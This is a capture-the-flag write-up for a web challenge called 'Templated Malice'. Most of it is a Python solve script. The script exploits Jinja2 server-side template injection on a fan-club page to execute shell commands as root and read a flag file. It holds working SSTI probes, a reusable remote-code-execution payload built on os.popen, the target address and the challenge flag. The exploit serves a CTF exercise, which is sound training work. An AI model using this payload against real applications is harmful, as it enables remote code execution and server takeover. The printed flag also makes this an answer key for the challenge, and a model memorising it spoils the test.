---
title: "Templated Malice"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "safaricom-ctf-team"
---

# Templated Malice

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Templated Malice (web, 300 pts) - http://54.72.82.22:8020

A "MOONLIGHT CLUB" K-pop fan club page renders a user-submitted `message` as a
Jinja2 template server-side -> SSTI -> RCE (running as root).

Probe:   {{7*7}}    -> 49        {{7*"7"}} -> 7777777
         {{self}}   -> TemplateReference
RCE:     {{lipsum.__globals__.os.popen("id").read()}} -> uid=0(root)

Flag lives at /app/flag.
"""
import urllib.request, urllib.parse, re

BASE = "http://54.72.82.22:8020"
FLAG = "safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}"


def ssti(payload):
    data = urllib.parse.urlencode({"message": payload}).encode()
    req = urllib.request.Request(BASE + "/", data=data)
    with urllib.request.urlopen(req, timeout=12) as r:
        return r.read().decode("utf-8", "replace")


def sh(cmd):
    return ssti('{{lipsum.__globals__.os.popen(%r).read()}}' % cmd)


def main():
    print("probe {{7*7}} ->", "49" if "49" in ssti("{{7*7}}") else "no")
    print("id           ->", sh("id").split("<h2>")[-1].split("<")[0].strip())

    out = sh("cat /app/flag")
    m = re.search(r"safctf\{[^}]*\}", out)
    print("flag         ->", m.group(0) if m else out[:200])
    assert m and m.group(0) == FLAG


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}
```
